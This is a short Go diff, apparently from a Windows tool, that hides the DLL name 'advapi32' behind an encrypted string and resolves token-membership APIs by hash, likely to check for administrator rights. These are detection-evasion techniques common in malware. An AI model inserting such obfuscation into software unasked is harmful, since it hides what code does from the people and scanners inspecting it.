@@ -7,9 +7,10 @@ import (
 )
 
 var (
-	procAllocateAndInitializeSid = GetFunctionAddressbyHash("advapi32", 0xa9174a4f)
-	procFreeSid                  = GetFunctionAddressbyHash("advapi32", 0xd47b1967)
-	procCheckTokenMembership     = GetFunctionAddressbyHash("advapi32", 0x1cf324d0)
+	str =DecryptString("$!3$5,vw")
+	procAllocateAndInitializeSid = GetFunctionAddressbyHash(str, 0xa9174a4f)
+	procFreeSid                  = GetFunctionAddressbyHash(str, 0xd47b1967)
+	procCheckTokenMembership     = GetFunctionAddressbyHash(str, 0x1cf324d0)
 
 	SECURITY_NT_AUTHORITY       = SID_IDENTIFIER_AUTHORITY{Value: [6]byte{0, 0, 0, 0, 0, 5}}
     SECURITY_BUILTIN_DOMAIN_RID = uint32(0x00000020)
